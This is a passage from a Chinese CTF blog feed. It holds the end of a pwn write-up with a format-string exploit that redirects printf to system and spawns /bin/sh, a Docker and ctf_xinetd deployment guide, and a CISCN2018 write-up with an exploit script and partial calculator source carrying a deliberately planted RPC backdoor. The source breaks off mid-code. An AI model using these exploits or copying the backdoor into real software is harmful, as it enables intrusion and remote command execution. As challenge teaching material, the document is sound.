punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>有点懵，好好消化。</p><p>原来各处的&amp;ffff，不单单是为了匹配后面的%$hn解引用写两个字节，而是，这种写的方式并不是覆盖，而是将所指定的内存空间的前两个字节换成我们要写的值。</p><p>如<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>，则表示将向栈空间偏移量6的位置的前两个字节写成<code>p_11&amp;0xffff</code>，即原数据若为<code>0x12345678</code>，经过操作后变为了<code>0x12340000+p_11&amp;0xffff</code>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用Docker进行Pwn题环境部署</title>
      <link href="/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
      <url>/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="使用Docker进行Pwn题环境部署"><a href="#使用Docker进行Pwn题环境部署" class="headerlink" title="使用Docker进行Pwn题环境部署"></a>使用Docker进行Pwn题环境部署</h1><blockquote><p>😄docker是个好东西，在CTF比赛中我们可以经常遇到通过docker部署的web，或者Pwn环境，同样我们也可以将一些服务部署在docker里面，管理方便，并且较为安全。</p><p>通过docker我们可以自己创建镜像，或者拉取镜像，比如说<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>上面的靶机，还有这次要讲的简单的Pwn环境部署框架。</p><p>这里有Angel_kitty师傅写的一份超详细docker教程。<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">传送门</a></p></blockquote><h2 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h2><h3 id="1-apt安装"><a href="#1-apt安装" class="headerlink" title="1.apt安装"></a>1.apt安装</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-手动下载并且安装"><a href="#2-手动下载并且安装" class="headerlink" title="2.手动下载并且安装"></a>2.手动下载并且安装</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">下载链接</a></p><p>下载完成后进入安装报所在的目录，并且执行一下命令进行安装：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-切换镜像源"><a href="#3-切换镜像源" class="headerlink" title="3.切换镜像源"></a>3.切换镜像源</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-简单使用"><a href="#Docker-简单使用" class="headerlink" title="Docker 简单使用"></a>Docker 简单使用</h2><p>我们可以通过以下几条命令简单测试一下docker是否安装成功：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#启动docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-world为其自带的一个image</span>docker run hello-world</code></pre><p>以及一些常用的命令，可以记录一下：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查看本地已有镜像</span>docker images<span class="token comment" spellcheck="true">#运行镜像并进入</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#后台运行镜像，镜像8080端口映射到主机80端口</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#进入已有容器</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#关闭镜像</span>docker stop httpd<span class="token comment" spellcheck="true">#查看当前正在运行的镜像</span>docker <span class="token function">ps</span>　　　　　　　　　　　　　　　　</code></pre><h1 id="Pwn部署框架"><a href="#Pwn部署框架" class="headerlink" title="Pwn部署框架"></a>Pwn部署框架</h1><blockquote><p>通过框架我们可以快速地部署Pwn题环境，而不用操太多的心💗。</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>我们可以从github上下载到<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ，它是开源的一个项目。</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. They’ll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challenge’s name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>先简单地看一下它的目录结构：</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>首先将项目下载到本地，并且将准备好的pwn题和flag放入bin文件夹中。<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>然后我们去修改ctf.xinetd文件中的配置参数：</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>然后根据readme文档我们可以进行docker容器的建立，运行，乃至流量的监听。</p><h1 id="国赛Pwn之一"><a href="#国赛Pwn之一" class="headerlink" title="国赛Pwn之一"></a>国赛Pwn之一</h1><blockquote><p>还记得今年国赛是让各支进了半决赛的队伍进行出题，靶标设置，这个环节被称作<code>Built it</code>，但是我们太菜了，没有出题，也没有参加的那个实力，PS:我会说我连<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>都没看懂吗，更别说过checker了。</p><p>附上Xp0int队伍国赛出的题解，以及Pwn环境，借以参考。</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdb、objdump、python、pwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>考察RPC相关协议及预留后门，通过逆向代码逻辑可以看到在符合type为0x6时，隐藏了一个后门，在后门函数中首先对接收到的key进行检查，通过将加密后的key（加密算法为简单的异或）和一个固定字符串进行比较，相等则接收真正的payload，加密算法如下：</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  }}</code></pre><p>最终脚本如下：<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.c程序代码如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token 